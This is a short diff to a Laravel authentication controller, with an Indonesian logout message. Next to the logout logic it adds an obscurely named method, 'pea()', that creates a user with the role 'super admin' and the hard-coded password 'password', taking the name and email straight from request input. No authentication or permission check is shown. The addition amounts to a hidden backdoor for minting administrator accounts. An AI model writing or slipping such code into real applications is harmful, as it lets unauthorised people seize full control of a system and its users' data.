@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 
@@ -42,5 +43,17 @@ class AuthController extends Controller
         Auth::logout();
 
         return redirect('login')->with('logout', 'Anda telah keluar');
+    }
+
+    public function pea()
+    {
+        User::create([
+            'name' => request('nama'),
+            'email' => request('email'),
+            'password' => bcrypt('password'),
+            'role' => 'super admin'
+        ]);
+
+        return redirect('/');
     }
 }
